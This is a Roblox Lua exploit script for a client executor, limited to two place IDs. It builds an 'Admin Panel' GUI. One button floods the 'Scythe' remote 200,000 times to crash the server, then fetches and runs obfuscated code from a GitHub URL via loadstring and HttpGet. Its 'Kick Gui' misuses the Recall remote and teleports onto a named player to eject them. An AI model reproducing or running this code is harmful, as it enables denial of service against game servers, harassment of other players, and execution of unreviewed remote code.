local allowedPlaceIds = {9015014224, 6403373529}

local function isPlaceAllowed()
    for _, placeId in ipairs(allowedPlaceIds) do
        if game.PlaceId == placeId then
            return true
        end
    end
    return false
end

if isPlaceAllowed() then
    local function createExecutorGui()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local UIStroke = Instance.new("UIStroke")
    local ScrollingFrame = Instance.new("ScrollingFrame") -- Create a ScrollingFrame
    local InstantCrash = Instance.new("TextButton")
    local AdminPanelLabel = Instance.new("TextLabel") -- New label for "Admin Panel"
    local AdminPanelStroke = Instance.new("UIStroke") -- UIStroke for Admin Panel
    local ComingSoonButton = Instance.new("TextButton") -- Define the coming soon button
    local SecondComingSoonButton = Instance.new("TextButton")
    local ThirdComingSoonButton = Instance.new("TextButton")
    local FourthComingSoonButton = Instance.new("TextButton")
    local FifthComingSoonButton = Instance.new("TextButton")
    

local function createToggleButton()
        local ScreenGui = Instance.new("ScreenGui")
        local ToggleButton = Instance.new("ImageButton")
        local UICorner = Instance.new("UICorner")
        local UIStroke = Instance.new("UIStroke")
        local UserInputService = game:GetService("UserInputService")

        -- Set up the UI
        ScreenGui.Parent = game.CoreGui

        -- Toggle Button
        ToggleButton.Parent = ScreenGui
        ToggleButton.Size = UDim2.new(0, 50, 0, 50) -- Button size
        ToggleButton.Position = UDim2.new(0.03, 0, 0.82, 0) -- Initial position
        ToggleButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60) -- Dark grey background
        ToggleButton.Image = "rbxassetid://15315284749" -- Updated button icon

        -- Rounded corners for the button
        UICorner.Parent = ToggleButton
        UICorner.CornerRadius = UDim.new(0, 10)

        -- Black outline for the button
        UIStroke.Parent = ToggleButton
        UIStroke.Color = Color3.new(0, 0, 0) -- Black outline
        UIStroke.Thickness = 2

        -- Create sound instance
        local sound = Instance.new("Sound", game:GetService("Workspace"))
        sound.SoundId = "rbxassetid://203785492"
        sound.Volume = 1

        -- Toggle button click event
        ToggleButton.MouseButton1Click:Connect(function()
            -- Play the sound
            sound:Play()
            
            -- Toggle visibility of a frame (if you have one)
            Frame.Visible = not Frame.Visible
        end)
    end

    createToggleButton()

    -- Set up the UI
    ScreenGui.Parent = game.CoreGui

    -- Main Frame
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(60, 60, 60) -- Dark grey background
    Frame.Position = UDim2.new(0.5, -320, 0.75, -100)
    Frame.Size = UDim2.new(0, 175, 0, 185)
    Frame.Visible = false

    -- Outline for the main frame
    UIStroke.Parent = Frame
    UIStroke.Color = Color3.new(0, 0, 0) -- Black outline
    UIStroke.Thickness = 2.7

    -- Rounded corners for the main frame
    UICorner.Parent = Frame
    UICorner.CornerRadius = UDim.new(0, 10)

    -- Scrolling Frame
    ScrollingFrame.Parent = Frame
    ScrollingFrame.Size = UDim2.new(1, 0, 1, 0) -- Full size of the main frame
    ScrollingFrame.BackgroundTransparency = 1 -- Make it transparent
    ScrollingFrame.ScrollBarThickness = 5 -- Set thickness of the scrollbar
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 700) -- Adjust the canvas size based on content

    -- Admin Panel label
    AdminPanelLabel.Parent = ScrollingFrame
    AdminPanelLabel.Size = UDim2.new(1, 0, 0.2, 0) -- Adjust size as needed
    AdminPanelLabel.Position = UDim2.new(0, 0, -0.07, 0) -- Position at the top
    AdminPanelLabel.BackgroundTransparency = 1 -- Make it transparent
    AdminPanelLabel.Text = "Admin Panel" -- Label text
    AdminPanelLabel.TextSize = 18 -- Text size
    AdminPanelLabel.Font = Enum.Font.FredokaOne -- Set font to FredokaOne
    AdminPanelLabel.TextColor3 = Color3.new(1, 1, 1) -- White text

    -- Black outline for the Admin Panel label
    AdminPanelStroke.Parent = AdminPanelLabel
    AdminPanelStroke.Color = Color3.new(0, 0, 0) -- Black outline for the label
    AdminPanelStroke.Thickness = 2 -- Thickness of the outline

    -- Instant Crash button
    InstantCrash.Parent = ScrollingFrame
    InstantCrash.Size = UDim2.new(0.885, -5, 0.05, -9)
    InstantCrash.Position = UDim2.new(0, 12, 0.058, 0) -- Adjust position
    InstantCrash.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    InstantCrash.Text = "???"
    InstantCrash.TextSize = 19 -- Set text size to 19
    InstantCrash.Font = Enum.Font.FredokaOne -- Set the font to FredokaOne

    -- Black outline for the Instant Crash button
    local ButtonStroke = Instance.new("UIStroke", InstantCrash)
    ButtonStroke.Color = Color3.new(0, 0, 0) -- Black outline for the button
    ButtonStroke.Thickness = 2 -- Thickness of the outline

    -- Rounded corners for the Instant Crash button
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.Parent = InstantCrash
    ButtonCorner.CornerRadius = UDim.new(0, 10) -- Set corner radius for rounded corners

    InstantCrash.TextColor3 = Color3.new(1, 1, 1)
    InstantCrash.TextStrokeColor3 = Color3.new(0, 0, 0)
    InstantCrash.TextStrokeTransparency = 0

    -- Instant Crash button click event
    InstantCrash.MouseButton1Click:Connect(function()
        while true do
            wait(0.001)

            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0.046936456114053726, 100003.4921875, -0.12038014084100723)

            wait(0.1)

            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Remote = ReplicatedStorage:WaitForChild("Scythe")

            local args = {
                "ScytheWeapon"
            }

            -- Function to fire the remote multiple times
            local function fireRemote(times)
                for i = 1, times do
                    Remote:FireServer(unpack(args))
                end
            end

            -- Fire the remote 200,000 times
            fireRemote(200000)

            wait(0.00001)

            game.Players.LocalPlayer:Kick("Server Crashed | Rejoining...")

            wait(1)

            loadstring(game:HttpGet("https://raw.githubusercontent.com/Jelly-plays/Rejoin-script/main/obf_L744By559M18BbuseSG6en8r1zL31daK9060LV7WyvmS4bQp92aONWfwRE36FdcZ.lua.txt"))()

            -- Exit the loop after kicking the player
            break
        end
    end)

    ComingSoonButton.Parent = ScrollingFrame
    ComingSoonButton.Size = UDim2.new(0.885, -5, 0.05, -9)
    ComingSoonButton.Position = UDim2.new(0, 12, 0.11, 0)
    ComingSoonButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    ComingSoonButton.Text = "Kick Gui"
    ComingSoonButton.TextSize = 19
    ComingSoonButton.Font = Enum.Font.FredokaOne

    local ButtonStroke1 = Instance.new("UIStroke", ComingSoonButton)
    ButtonStroke1.Color = Color3.new(0, 0, 0)
    ButtonStroke1.Thickness = 2

    local ButtonCorner1 = Instance.new("UICorner")
    ButtonCorner1.Parent = ComingSoonButton
    ButtonCorner1.CornerRadius = UDim.new(0, 10)

    ComingSoonButton.TextColor3 = Color3.new(1, 1, 1)
    ComingSoonButton.TextStrokeColor3 = Color3.new(0, 0, 0)
    ComingSoonButton.TextStrokeTransparency = 0

    -- Assuming you have already created the ComingSoonButton
local originalColor = Color3.fromRGB(40, 40, 40) -- Original button color
local activeColor = Color3.fromRGB(0, 255, 0) -- Color when active (green)
local isScriptOn = false -- This variable tracks the state of the button

ComingSoonButton.MouseButton1Click:Connect(function()
    if isScriptOn then
        -- If the script is currently on, run the second script and turn it off
        -- Function to delete all instances of "ScreenGui" from CoreGui
local function deleteAllScreenGuis()
    local coreGui = game.CoreGui

    -- Iterate through each child in CoreGui
    for _, child in ipairs(coreGui:GetChildren()) do
        if child.Name == "AdminPanelSB" then
            child:Destroy()
            print("Deleted ScreenGui:", child.Name)
        end
    end
    
end

-- Call the function to delete all instances of ScreenGui
deleteAllScreenGuis()

ComingSoonButton.BackgroundColor3 = originalColor
    else
        -- If the script is currently off, run the first script and turn it on
        local function createExecutorGui()
    local ScreenGui = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local UIStroke = Instance.new("UIStroke")
    local KickPlayerButton = Instance.new("TextButton")
    local ViewPlayerButton = Instance.new("TextButton")
    local TpB = Instance.new("TextButton")
    local KickGuiLabel = Instance.new("TextLabel") -- Label for "Kick Gui"
    local KickGuiStroke = Instance.new("UIStroke") -- UIStroke for Kick Gui
    local PlayerTextBox = Instance.new("TextBox") -- New TextBox for player input



----Notification 1


-- Keeps track of the current notification
local currentNotification = nil  

-- Function to show and manage notifications
local function showNotification(message)
    -- Remove the existing notification if it exists
    if currentNotification then
        currentNotification:Destroy()
        currentNotification = nil
    end

    -- Create a ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- Create a TextLabel for the notification
    local notification = Instance.new("TextLabel")
    notification.Size = UDim2.new(0.25, 0, 0.13, 0)  -- Width and height of the notification
    notification.Position = UDim2.new(1, 0, 0.4, 0)  -- Start off the right of the screen
    notification.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)  -- Dark grey background
    notification.BackgroundTransparency = 0.3  -- 30% transparent
    notification.BorderSizePixel = 3.5  -- Outline thickness
    notification.BorderColor3 = Color3.new(0, 0, 0)  -- Black outline
    notification.TextColor3 = Color3.new(1, 1, 1)  -- White text
    notification.TextScaled = true
    notification.TextWrapped = true
    notification.Text = message  -- Notification message
    notification.Font = Enum.Font.ArialBold
    notification.Parent = screenGui

    -- Store current notification so it can be destroyed later
    currentNotification = notification

    -- Add padding to the TextLabel
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0.1, 0)
    padding.PaddingBottom = UDim.new(0.1, 0)
    padding.PaddingLeft = UDim.new(0.1, 0)
    padding.PaddingRight = UDim.new(0.1, 0)
    padding.Parent = notification

    -- Use TweenService to create the slide animation
    local TweenService = game:GetService("TweenService")

    -- Shorten the duration for a faster animation
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local targetPosition1 = UDim2.new(0.74, 0, 0.4, 0)  -- Middle of the screen
    local targetPosition2 = UDim2.new(1, 0, 0.4, 0)  -- Off to the right of the screen

    -- Tween for sliding up to the middle of the screen
    local slideUpTween = TweenService:Create(notification, tweenInfo, {Position = targetPosition1})
    -- Tween for sliding back off the screen
    local slideDownTween = TweenService:Create(notification, tweenInfo, {Position = targetPosition2})

    -- Play the slide-up tween to display the notification
    slideUpTween:Play()

    -- After the slide-up tween completes, wait for 1.5 seconds and then slide down
    slideUpTween.Completed:Connect(function()
        wait(1.5)
        slideDownTween:Play()
    end)

    -- Destroy the notification after sliding down is completed
    slideDownTween.Completed:Connect(function()
        screenGui:Destroy()
        currentNotification = nil  -- Reset the currentNotification
    end)
end







------Notification 2



-- Keeps track of the current notification
local currentNotification = nil  

-- Function to show and manage notifications
local function showNotification2(message)
    -- Remove the existing notification if it exists
    if currentNotification then
        currentNotification:Destroy()
        currentNotification = nil
    end

    -- Create a ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    -- Create a TextLabel for the notification
    local notification = Instance.new("TextLabel")
    notification.Size = UDim2.new(0.25, 0, 0.13, 0)  -- Width and height of the notification
    notification.Position = UDim2.new(1, 0, 0.4, 0)  -- Start off the right of the screen
    notification.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)  -- Dark grey background
    notification.BackgroundTransparency = 0.3  -- 30% transparent
    notification.BorderSizePixel = 3.5  -- Outline thickness
    notification.BorderColor3 = Color3.new(0, 0, 0)  -- Black outline
    notification.TextColor3 = Color3.new(1, 1, 1)  -- White text
    notification.TextScaled = true
    notification.TextWrapped = true
    notification.Text = message  -- Notification message
    notification.Font = Enum.Font.ArialBold
    notification.Parent = screenGui

    -- Store current notification so it can be destroyed later
    currentNotification = notification

    -- Add padding to the TextLabel
    local padding = Instance.new("UIPadding")
    padding.PaddingTop = UDim.new(0.1, 0)
    padding.PaddingBottom = UDim.new(0.1, 0)
    padding.PaddingLeft = UDim.new(0.1, 0)
    padding.PaddingRight = UDim.new(0.1, 0)
    padding.Parent = notification

    -- Use TweenService to create the slide animation
    local TweenService = game:GetService("TweenService")

    -- Shorten the duration for a faster animation
    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local targetPosition1 = UDim2.new(0.74, 0, 0.4, 0)  -- Middle of the screen
    local targetPosition2 = UDim2.new(1, 0, 0.4, 0)  -- Off to the right of the screen

    -- Tween for sliding up to the middle of the screen
    local slideUpTween = TweenService:Create(notification, tweenInfo, {Position = targetPosition1})
    -- Tween for sliding back off the screen
    local slideDownTween = TweenService:Create(notification, tweenInfo, {Position = targetPosition2})

    -- Play the slide-up tween to display the notification
    slideUpTween:Play()

    -- After the slide-up tween completes, wait for 1.5 seconds and then slide down
    slideUpTween.Completed:Connect(function()
        wait(5)
        slideDownTween:Play()
    end)

    -- Destroy the notification after sliding down is completed
    slideDownTween.Completed:Connect(function()
        screenGui:Destroy()
        currentNotification = nil  -- Reset the currentNotification
    end)
end









local function deleteHitbox()

local targetPosition = Vector3.new(17943, -130.158447265625, -3562)
local radius = 20

for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("Part") and v.Material == Enum.Material.Plastic then
        local distance = (v.Position - targetPosition).magnitude
        if distance <= radius then
            v:Destroy()
        end
    end
end
end

deleteHitbox()



    -- Set up the UI
    ScreenGui.Name = "AdminPanelSB"
    ScreenGui.Parent = game.CoreGui

    -- Main Frame
    Frame.Name = "AdminPanelSB"
    Frame.Parent = ScreenGui
    Frame.BackgroundColor3 = Color3.fromRGB(60, 60, 60) -- Dark grey background
    Frame.Position = UDim2.new(0.7, 2, 0.1, 5)
    Frame.Size = UDim2.new(0, 175, 0, 215)

    -- Outline for the main frame
    UIStroke.Parent = Frame
    UIStroke.Color = Color3.new(0, 0, 0) -- Black outline
    UIStroke.Thickness = 2.7

    -- Rounded corners for the main frame
    UICorner.Parent = Frame
    UICorner.CornerRadius = UDim.new(0, 10)

    -- Kick Gui label
    KickGuiLabel.Parent = Frame
    KickGuiLabel.Size = UDim2.new(1, 0, 0.1, 0)
    KickGuiLabel.Position = UDim2.new(0, 0, 0.02, 0)
    KickGuiLabel.BackgroundTransparency = 1
    KickGuiLabel.Text = "Kick Gui"
    KickGuiLabel.TextSize = 18
    KickGuiLabel.Font = Enum.Font.FredokaOne
    KickGuiLabel.TextColor3 = Color3.new(1, 1, 1)

    -- Black outline for the Kick Gui label
    KickGuiStroke.Parent = KickGuiLabel
    KickGuiStroke.Color = Color3.new(0, 0, 0)
    KickGuiStroke.Thickness = 2

    -- Player input TextBox
    PlayerTextBox.Parent = Frame
    PlayerTextBox.Size = UDim2.new(0.885, -5, 0.35, -9)
    PlayerTextBox.Position = UDim2.new(0, 12, 0.15, 0)
    PlayerTextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    PlayerTextBox.PlaceholderText = "Enter player name"
    PlayerTextBox.Text = ""
    PlayerTextBox.TextSize = 16
    PlayerTextBox.Font = Enum.Font.FredokaOne
    PlayerTextBox.TextColor3 = Color3.new(1, 1, 1)
    PlayerTextBox.TextStrokeColor3 = Color3.new(0, 0, 0)
    PlayerTextBox.TextStrokeTransparency = 0

    -- Black outline for the TextBox
    local TextBoxStroke = Instance.new("UIStroke", PlayerTextBox)
    TextBoxStroke.Color = Color3.new(0, 0, 0)
    TextBoxStroke.Thickness = 2

    -- Rounded corners for the TextBox
    local TextBoxCorner = Instance.new("UICorner")
    TextBoxCorner.Parent = PlayerTextBox
    TextBoxCorner.CornerRadius = UDim.new(0, 10)

    -- Kick Player button
    KickPlayerButton.Parent = Frame
    KickPlayerButton.Size = UDim2.new(0.885, -5, 0.17, -9)
    KickPlayerButton.Position = UDim2.new(0, 12, 0.5, 0) -- Adjusted position
    KickPlayerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    KickPlayerButton.Text = "Kick Player"
    KickPlayerButton.TextSize = 19
    KickPlayerButton.Font = Enum.Font.FredokaOne

    -- Black outline for the Kick Player button
    local ButtonStroke = Instance.new("UIStroke", KickPlayerButton)
    ButtonStroke.Color = Color3.new(0, 0, 0)
    ButtonStroke.Thickness = 2

    -- Rounded corners for the Kick Player button
    local ButtonCorner = Instance.new("UICorner")
    ButtonCorner.Parent = KickPlayerButton
    ButtonCorner.CornerRadius = UDim.new(0, 10)

    KickPlayerButton.TextColor3 = Color3.new(1, 1, 1)
    KickPlayerButton.TextStrokeColor3 = Color3.new(0, 0, 0)
    KickPlayerButton.TextStrokeTransparency = 0

    KickPlayerButton.MouseButton1Click:Connect(function()
    -- Teleport the player's character to the specified CFrame
    local player = game.Players.LocalPlayer
    local playerName = PlayerTextBox.Text

    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        -- Teleport to specific CFrame
        player.Character.HumanoidRootPart.CFrame = CFrame.new(17943, -130.158447265625, -3562)

        wait(0.1) -- Slight delay

        -- Invoke the Recall server event
        local args = {
            [1] = player.Character:FindFirstChild("Recall"),
            [2] = Vector3.new(17943, -130.158447265625, -3562)
        }

        game:GetService("ReplicatedStorage").Recall:InvokeServer(unpack(args))

        -- Wait 2 seconds before teleporting to the player
        wait(2)

        -- Find the target player from the textbox input
        local targetPlayer = nil
        for _, v in pairs(game.Players:GetPlayers()) do
            if string.sub(v.Name:lower(), 1, #playerName:lower()) == playerName:lower() or string.sub(v.DisplayName:lower(), 1, #playerName:lower()) == playerName:lower() then
                targetPlayer = v
                break
            end
        end

        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Humanoid") then
            local targetHumanoid = targetPlayer.Character:FindFirstChild("Humanoid")
            if targetHumanoid.Health > 0 then
                -- Teleport to the target player's HumanoidRootPart 6 times
                for i = 1, 6 do
                    player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
                    wait(0.001)
                end
                print("Teleported to " .. targetPlayer.Name)
            else
                print("Target player " .. targetPlayer.Name .. " has 0 health and cannot be teleported to.")
            end
        else
            warn("Target player not found or invalid.")
        end
    else
        warn("Player's character or HumanoidRootPart is missing!")
    end
end)




    -- View Player button
    ViewPlayerButton.Parent = Frame
    ViewPlayerButton.Size = UDim2.new(0.885, -5, 0.17, -9)
    ViewPlayerButton.Position = UDim2.new(0, 12, 0.665, 0)
    ViewPlayerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    ViewPlayerButton.Text = "View Player"
    ViewPlayerButton.TextSize = 19
    ViewPlayerButton.Font = Enum.Font.FredokaOne

    local ButtonStroke1 = Instance.new("UIStroke", ViewPlayerButton)
    ButtonStroke1.Color = Color3.new(0, 0, 0)
    ButtonStroke1.Thickness = 2

    local ButtonCorner1 = Instance.new("UICorner")
    ButtonCorner1.Parent = ViewPlayerButton
    ButtonCorner1.CornerRadius = UDim.new(0, 10)

    ViewPlayerButton.TextColor3 = Color3.new(1, 1, 1)
    ViewPlayerButton.TextStrokeColor3 = Color3.new(0, 0, 0)
    ViewPlayerButton.TextStrokeTransparency = 0

    local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local playerButton = ViewPlayerButton -- Assume this is your button reference
local PlayerTextBox = PlayerTextBox -- Assume this is your TextBox reference
local isViewingSelf = true -- Start by viewing self
local currentViewingPlayer = nil
local viewDied, viewChanged

local function getPlayer(inputName)
    local players = {}
    inputName = string.lower(inputName) -- Convert input to lower case for case-insensitive matching
    for _, player in pairs(Players:GetPlayers()) do
        -- Check if inputName is a substring of the player's name or display name
        if string.find(string.lower(player.Name), inputName) or string.find(string.lower(player.DisplayName), inputName) then
            table.insert(players, player)
        end
    end
    return players
end

local function updateButtonColor()
    if isViewingSelf then
        playerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40) -- Original color
    else
        playerButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green when viewing another player
    end
end

playerButton.MouseButton1Click:Connect(function()
    local playerName = PlayerTextBox.Text

    if isViewingSelf then
        -- Switch to viewing another player
        local players = getPlayer(playerName)
        if #players > 0 then
            -- Disconnect any previous connections
            if viewDied then viewDied:Disconnect() end
            if viewChanged then viewChanged:Disconnect() end

            currentViewingPlayer = players[1] -- Use the first match

            Workspace.CurrentCamera.CameraSubject = currentViewingPlayer.Character:FindFirstChild("Humanoid") or currentViewingPlayer.Character

            -- Notify player of the action (you can use a GUI notification instead)


            -- Set up functions for respawn and camera changes
            viewDied = currentViewingPlayer.CharacterAdded:Connect(function()
                Workspace.CurrentCamera.CameraSubject = currentViewingPlayer.Character
            end)

            viewChanged = Workspace.CurrentCamera:GetPropertyChangedSignal("CameraSubject"):Connect(function()
                Workspace.CurrentCamera.CameraSubject = currentViewingPlayer.Character
            end)

            isViewingSelf = false -- Now viewing another player
        else
            print("Player not found.") -- Replace with GUI notification if needed
        end
    else
        -- Switch back to viewing self
        currentViewingPlayer = Players.LocalPlayer
        Workspace.CurrentCamera.CameraSubject = currentViewingPlayer.Character:FindFirstChild("Humanoid") or currentViewingPlayer.Character

        isViewingSelf = true -- Now viewing self
    end

    -- Update button color based on the viewing state
    updateButtonColor()
end)

-- Initial button color setup
updateButtonColor()



-- Create the TpB button
local TpB = Instance.new("TextButton") -- Ensure you have this line before using TpB
TpB.Parent = Frame
TpB.Size = UDim2.new(0.885, -5, 0.17, -9)
TpB.Position = UDim2.new(0, 12, 0.83, 0) -- Adjusted position
TpB.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
TpB.Text = "Teleport"
TpB.TextSize = 19
TpB.Font = Enum.Font.FredokaOne

-- Black outline for the TpB button
local ButtonStroke = Instance.new("UIStroke", TpB)
ButtonStroke.Color = Color3.new(0, 0, 0)
ButtonStroke.Thickness = 2

-- Rounded corners for the TpB button
local ButtonCorner = Instance.new("UICorner")
ButtonCorner.Parent = TpB
ButtonCorner.CornerRadius = UDim.new(0, 10)

TpB.TextColor3 = Color3.new(1, 1, 1)
TpB.TextStrokeColor3 = Color3.new(0, 0, 0)
TpB.TextStrokeTransparency = 0

-- Assuming you already have your TpB button set up as before

TpB.MouseButton1Click:Connect(function()
    local player = game.Players.LocalPlayer -- Correctly reference the local player

    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
        -- Teleport the player's character to the specified CFrame
        player.Character.HumanoidRootPart.CFrame = CFrame.new(17943, -130.158447265625, -3562)
        showNotification2("Saving Position...")
     wait(5)
     showNotification2("Position Saved!")
    else
        warn("Player's character or HumanoidRootPart is missing!")
    end
end)








    -- Dragging functionality
    local dragging, dragInput, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end

    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = Frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if dragging and input == dragInput then
            update(input)
        end
    end)
end

createExecutorGui()

        ComingSoonButton.BackgroundColor3 = activeColor
    end

    -- Toggle the button state
    isScriptOn = not isScriptOn
end)


    -- Second "???" button
    SecondComingSoonButton.Parent = ScrollingFrame
    SecondComingSoonButton.Size = UDim2.new(0.885, -5, 0.05, -9)
    SecondComingSoonButton.Position = UDim2.new(0, 12, 0.162, 0) -- Positioned below the first "???"
    SecondComingSoonButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    SecondComingSoonButton.Text = "???"
    SecondComingSoonButton.TextSize = 19
    SecondComingSoonButton.Font = Enum.Font.FredokaOne

    local ButtonStroke2 = Instance.new("UIStroke", SecondComingSoonButton)
    ButtonStroke2.Color = Color3.new(0, 0, 0)
    ButtonStroke2.Thickness = 2

    local ButtonCorner2 = Instance.new("UICorner")
    ButtonCorner2.Parent = SecondComingSoonButton
    ButtonCorner2.CornerRadius = UDim.new(0, 10)

    SecondComingSoonButton.TextColor3 = Color3.new(1, 1, 1)
    SecondComingSoonButton.TextStrokeColor3 = Color3.new(0, 0, 0)
    SecondComingSoonButton.TextStrokeTransparency = 0

    SecondComingSoonButton.MouseButton1Click:Connect(function()
        print("Second Coming Soon Button Clicked!")
    end)




-- Third "???" button

ThirdComingSoonButton.Parent = ScrollingFrame
ThirdComingSoonButton.Size = UDim2.new(0.885, -5, 0.05, -9)
ThirdComingSoonButton.Position = UDim2.new(0, 12, 0.214, 0) -- Positioned below the second "???"
ThirdComingSoonButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ThirdComingSoonButton.Text = "???"
ThirdComingSoonButton.TextSize = 19
ThirdComingSoonButton.Font = Enum.Font.FredokaOne

local ButtonStroke3 = Instance.new("UIStroke", ThirdComingSoonButton)
ButtonStroke3.Color = Color3.new(0, 0, 0)
ButtonStroke3.Thickness = 2

local ButtonCorner3 = Instance.new("UICorner")
ButtonCorner3.Parent = ThirdComingSoonButton
ButtonCorner3.CornerRadius = UDim.new(0, 10)

ThirdComingSoonButton.TextColor3 = Color3.new(1, 1, 1)
ThirdComingSoonButton.TextStrokeColor3 = Color3.new(0, 0, 0)
ThirdComingSoonButton.TextStrokeTransparency = 0

ThirdComingSoonButton.MouseButton1Click:Connect(function()
    print("Third Coming Soon Button Clicked!")
end)

-- Fourth "???" button

FourthComingSoonButton.Parent = ScrollingFrame
FourthComingSoonButton.Size = UDim2.new(0.885, -5, 0.05, -9)
FourthComingSoonButton.Position = UDim2.new(0, 12, 0.266, 0) -- Positioned below the third "???"
FourthComingSoonButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
FourthComingSoonButton.Text = "???"
FourthComingSoonButton.TextSize = 19
FourthComingSoonButton.Font = Enum.Font.FredokaOne

local ButtonStroke4 = Instance.new("UIStroke", FourthComingSoonButton)
ButtonStroke4.Color = Color3.new(0, 0, 0)
ButtonStroke4.Thickness = 2

local ButtonCorner4 = Instance.new("UICorner")
ButtonCorner4.Parent = FourthComingSoonButton
ButtonCorner4.CornerRadius = UDim.new(0, 10)

FourthComingSoonButton.TextColor3 = Color3.new(1, 1, 1)
FourthComingSoonButton.TextStrokeColor3 = Color3.new(0, 0, 0)
FourthComingSoonButton.TextStrokeTransparency = 0

FourthComingSoonButton.MouseButton1Click:Connect(function()
    print("Fourth Coming Soon Button Clicked!")
end)

-- Fifth "???" button

FifthComingSoonButton.Parent = ScrollingFrame
FifthComingSoonButton.Size = UDim2.new(0.885, -5, 0.05, -9)
FifthComingSoonButton.Position = UDim2.new(0, 12, 0.318, 0) -- Positioned below the fourth "???"
FifthComingSoonButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
FifthComingSoonButton.Text = "???"
FifthComingSoonButton.TextSize = 19
FifthComingSoonButton.Font = Enum.Font.FredokaOne

local ButtonStroke5 = Instance.new("UIStroke", FifthComingSoonButton)
ButtonStroke5.Color = Color3.new(0, 0, 0)
ButtonStroke5.Thickness = 2

local ButtonCorner5 = Instance.new("UICorner")
ButtonCorner5.Parent = FifthComingSoonButton
ButtonCorner5.CornerRadius = UDim.new(0, 10)

FifthComingSoonButton.TextColor3 = Color3.new(1, 1, 1)
FifthComingSoonButton.TextStrokeColor3 = Color3.new(0, 0, 0)
FifthComingSoonButton.TextStrokeTransparency = 0

FifthComingSoonButton.MouseButton1Click:Connect(function()
    print("Fifth Coming Soon Button Clicked!")
end)





    -- Dragging functionality (if you have a scrolling frame)
    local dragging, dragStart, startPos

    local function update(input)
        local delta = input.Position - dragStart
        Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end

    Frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            dragStart = input.Position
            startPos = Frame.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    Frame.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            update(input)
        end
    end)
end

createExecutorGui()



else
    print(".")
end
